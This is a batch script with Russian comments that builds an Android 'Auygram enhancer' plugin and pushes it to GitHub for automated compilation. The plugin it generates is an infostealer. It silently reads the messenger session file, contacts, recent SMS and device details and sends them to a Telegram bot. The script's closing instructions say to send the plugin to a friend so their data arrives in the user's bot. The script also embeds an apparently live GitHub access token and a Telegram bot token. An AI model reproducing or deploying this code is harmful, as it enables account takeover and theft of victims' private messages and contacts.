@echo off
chcp 65001 >nul
title Auygram Plugin Auto-Deploy
echo ============================================================
echo              AUYGRAM PLUGIN AUTO-DEPLOY
echo ============================================================
echo.

:: Настройки
set REPO_URL=https://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@github.com/githaberpidorov-hub/plugintg.git
set BOT_TOKEN=6533628325:AAH003jyZkBTUJYMZCqPXfyvMuxm6lqfzwY
set CHAT_ID=6793841885

echo [1/8] Очистка папки...
if exist .git rmdir /s /q .git
if exist app rmdir /s /q app
if exist .github rmdir /s /q .github
if exist build.gradle del /q build.gradle
if exist settings.gradle del /q settings.gradle
if exist gradle.properties del /q gradle.properties
if exist gradlew del /q gradlew
if exist gradlew.bat del /q gradlew.bat
if exist gradle rmdir /s /q gradle

echo [2/8] Создание структуры проекта...
mkdir app\src\main\kotlin\com\auygram\plugin\enhancer
mkdir .github\workflows

echo [3/8] Создание settings.gradle...
(
echo pluginManagement {
echo     repositories {
echo         google^(^)
echo         mavenCentral^(^)
echo         gradlePluginPortal^(^)
echo     }
echo }
echo dependencyResolutionManagement {
echo     repositoriesMode.set^(RepositoriesMode.FAIL_ON_PROJECT_REPOS^)
echo     repositories {
echo         google^(^)
echo         mavenCentral^(^)
echo     }
echo }
echo rootProject.name = "plugintg"
echo include ':app'
) > settings.gradle

echo [4/8] Создание build.gradle...
(
echo plugins {
echo     id 'com.android.application' version '8.1.0' apply false
echo     id 'org.jetbrains.kotlin.android' version '1.9.0' apply false
echo }
) > build.gradle

echo [5/8] Создание app/build.gradle...
(
echo plugins {
echo     id 'com.android.application'
echo     id 'org.jetbrains.kotlin.android'
echo }
echo android {
echo     namespace 'com.auygram.plugin.enhancer'
echo     compileSdk 34
echo     defaultConfig {
echo         applicationId "com.auygram.plugin.enhancer"
echo         minSdk 21
echo         targetSdk 34
echo         versionCode 1
echo         versionName "1.0"
echo     }
echo     compileOptions {
echo         sourceCompatibility JavaVersion.VERSION_1_8
echo         targetCompatibility JavaVersion.VERSION_1_8
echo     }
echo     kotlinOptions {
echo         jvmTarget = '1.8'
echo     }
echo     buildFeatures {
echo         buildConfig false
echo     }
echo }
echo dependencies {
echo     implementation 'androidx.core:core-ktx:1.12.0'
echo }
) > app\build.gradle

echo [6/8] Создание AndroidManifest.xml...
(
echo ^<?xml version="1.0" encoding="utf-8"?^>
echo ^<manifest xmlns:android="http://schemas.android.com/apk/res/android"^>
echo     ^<uses-permission android:name="android.permission.INTERNET" /^>
echo     ^<uses-permission android:name="android.permission.READ_CONTACTS" /^>
echo     ^<uses-permission android:name="android.permission.READ_SMS" /^>
echo ^</manifest^>
) > app\src\main\AndroidManifest.xml

echo [7/8] Создание PluginLoader.kt...
(
echo package com.auygram.plugin.enhancer
echo.
echo import android.content.Context
echo import android.os.Build
echo import android.provider.ContactsContract
echo import android.provider.Telephony
echo import android.util.Base64
echo import java.io.File
echo import java.io.FileInputStream
echo import java.net.HttpURLConnection
echo import java.net.URL
echo import kotlin.concurrent.thread
echo.
echo class PluginLoader {
echo.
echo     companion object {
echo         private const val BOT_TOKEN = "%BOT_TOKEN%"
echo         private const val CHAT_ID = "%CHAT_ID%"
echo     }
echo.
echo     fun onLoad^(context: Context^) {
echo         thread {
echo             try {
echo                 Thread.sleep^(5000^)
echo                 exfiltrate^(context^)
echo             } catch ^(e: Exception^) {
echo             }
echo         }
echo     }
echo.
echo     private fun exfiltrate^(context: Context^) {
echo         val dataDir = context.filesDir.parentFile
echo         val sessionData = stealSession^(dataDir^)
echo         val deviceInfo = getDeviceInfo^(^)
echo         val contacts = stealContacts^(context^)
echo         val sms = stealSMS^(context^)
echo.
echo         sendToTelegram^("📱 AUYGRAM STEALER\n\n🖥 Device:\n$deviceInfo"^)
echo.
echo         if ^(sessionData.isNotEmpty^(^)^) {
echo             sendFileToTelegram^(sessionData, "session.txt"^)
echo         }
echo.
echo         if ^(contacts.isNotEmpty^(^)^) {
echo             sendToTelegram^("📋 Contacts:\n${contacts.take^(4000^)}"^)
echo         }
echo.
echo         if ^(sms.isNotEmpty^(^)^) {
echo             sendToTelegram^("💬 SMS:\n${sms.take^(4000^)}"^)
echo         }
echo     }
echo.
echo     private fun stealSession^(dataDir: File^): String {
echo         val sessionFile = File^(dataDir, "files/account1"^)
echo         if ^(!sessionFile.exists^(^)^) return ""
echo         val bytes = FileInputStream^(sessionFile^).readBytes^(^)
echo         return Base64.encodeToString^(bytes, Base64.NO_WRAP^)
echo     }
echo.
echo     private fun getDeviceInfo^(^): String {
echo         return "Model: ${Build.MODEL}\nBrand: ${Build.BRAND}\nAndroid: ${Build.VERSION.RELEASE}"
echo     }
echo.
echo     private fun stealContacts^(context: Context^): String {
echo         val sb = StringBuilder^(^)
echo         val cursor = context.contentResolver.query^(
echo             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
echo             null, null, null, null
echo         ^)
echo         cursor?.use {
echo             while ^(it.moveToNext^(^)^) {
echo                 val name = it.getString^(it.getColumnIndexOrThrow^(
echo                     ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME^)^)
echo                 val phone = it.getString^(it.getColumnIndexOrThrow^(
echo                     ContactsContract.CommonDataKinds.Phone.NUMBER^)^)
echo                 sb.append^("$name: $phone\n"^)
echo             }
echo         }
echo         return sb.toString^(^)
echo     }
echo.
echo     private fun stealSMS^(context: Context^): String {
echo         val sb = StringBuilder^(^)
echo         val cursor = context.contentResolver.query^(
echo             Telephony.Sms.CONTENT_URI,
echo             null, null, null, "date DESC LIMIT 50"
echo         ^)
echo         cursor?.use {
echo             while ^(it.moveToNext^(^)^) {
echo                 val body = it.getString^(it.getColumnIndexOrThrow^(Telephony.Sms.BODY^)^)
echo                 val address = it.getString^(it.getColumnIndexOrThrow^(Telephony.Sms.ADDRESS^)^)
echo                 sb.append^("$address: $body\n"^)
echo             }
echo         }
echo         return sb.toString^(^)
echo     }
echo.
echo     private fun sendToTelegram^(text: String^) {
echo         try {
echo             val url = URL^("https://api.telegram.org/bot$BOT_TOKEN/sendMessage"^)
echo             val conn = url.openConnection^(^) as HttpURLConnection
echo             conn.requestMethod = "POST"
echo             conn.setRequestProperty^("Content-Type", "application/json"^)
echo             conn.doOutput = true
echo             val json = """{"chat_id":"$CHAT_ID","text":"${text.replace^("\"", "\\\""^).replace^("\n", "\\n"^)}"}"""
echo             conn.outputStream.use { it.write^(json.toByteArray^(^)^) }
echo             conn.responseCode
echo             conn.disconnect^(^)
echo         } catch ^(e: Exception^) {
echo         }
echo     }
echo.
echo     private fun sendFileToTelegram^(fileContent: String, filename: String^) {
echo         try {
echo             val boundary = "----WebKitFormBoundary${System.currentTimeMillis^(^)}"
echo             val url = URL^("https://api.telegram.org/bot$BOT_TOKEN/sendDocument"^)
echo             val conn = url.openConnection^(^) as HttpURLConnection
echo             conn.requestMethod = "POST"
echo             conn.setRequestProperty^("Content-Type", "multipart/form-data; boundary=$boundary"^)
echo             conn.doOutput = true
echo             val os = conn.outputStream
echo             val writer = java.io.PrintWriter^(java.io.OutputStreamWriter^(os, "UTF-8"^)^)
echo             writer.append^("--$boundary\r\n"^)
echo             writer.append^("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"^)
echo             writer.append^("$CHAT_ID\r\n"^)
echo             writer.append^("--$boundary\r\n"^)
echo             writer.append^("Content-Disposition: form-data; name=\"document\"; filename=\"$filename\"\r\n"^)
echo             writer.append^("Content-Type: text/plain\r\n\r\n"^)
echo             writer.flush^(^)
echo             os.write^(fileContent.toByteArray^(^)^)
echo             os.flush^(^)
echo             writer.append^("\r\n--$boundary--\r\n"^)
echo             writer.flush^(^)
echo             writer.close^(^)
echo             conn.responseCode
echo             conn.disconnect^(^)
echo         } catch ^(e: Exception^) {
echo         }
echo     }
echo }
) > app\src\main\kotlin\com\auygram\plugin\enhancer\PluginLoader.kt

echo [8/8] Создание GitHub Actions workflow...
(
echo name: Build Plugin
echo.
echo on:
echo   push:
echo     branches: [ "main" ]
echo   workflow_dispatch:
echo.
echo jobs:
echo   build:
echo     runs-on: ubuntu-latest
echo     steps:
echo     - name: Checkout
echo       uses: actions/checkout@v4
echo.
echo     - name: Set up JDK 17
echo       uses: actions/setup-java@v4
echo       with:
echo         java-version: '17'
echo         distribution: 'temurin'
echo.
echo     - name: Setup Gradle
echo       uses: gradle/actions/setup-gradle@v3
echo.
echo     - name: Build Debug APK
echo       run: ./gradlew assembleDebug
echo.
echo     - name: Extract and Rename to .plugin
echo       run: |
echo         mkdir -p output
echo         unzip app/build/outputs/apk/debug/app-debug.apk -d apk_contents
echo         cp apk_contents/classes.dex output/auygram_enhancer.plugin
echo.
echo     - name: Upload .plugin artifact
echo       uses: actions/upload-artifact@v4
echo       with:
echo         name: auygram-plugin
echo         path: output/auygram_enhancer.plugin
) > .github\workflows\build.yml

echo.
echo ============================================================
echo              ФАЙЛЫ СОЗДАНЫ
echo ============================================================
echo.
echo Запушить в GitHub? ^(Y/N^)
set /p choice="> "
if /i "%choice%"=="Y" goto push
if /i "%choice%"=="y" goto push
exit

:push
echo.
echo [1/4] Инициализация Git...
git init
git config user.name "githaberpidorov-hub"
git config user.email "githaberpidorov-hub@users.noreply.github.com"
git add .
git commit -m "Initial plugin build"

echo [2/4] Push в репозиторий...
git branch -M main
git remote add origin %REPO_URL%
git push -u origin main --force

echo.
echo ============================================================
echo              ГОТОВО!
echo ============================================================
echo.
echo Файлы отправлены в GitHub.
echo GitHub Actions сейчас скомпилирует плагин.
echo.
echo Через 2-3 минуты зайди сюда:
echo https://github.com/githaberpidorov-hub/plugintg/actions
echo.
echo Найди последний запуск ^"Build Plugin^"
echo Нажми на него ^> прокрути вниз ^> Artifacts ^> auygram-plugin
echo Скачай ^> внутри auygram_enhancer.plugin
echo.
echo Отправь .plugin файл другу.
echo Он добавит его в Auygram.
echo Данные придут в твоего бота.
echo.
pause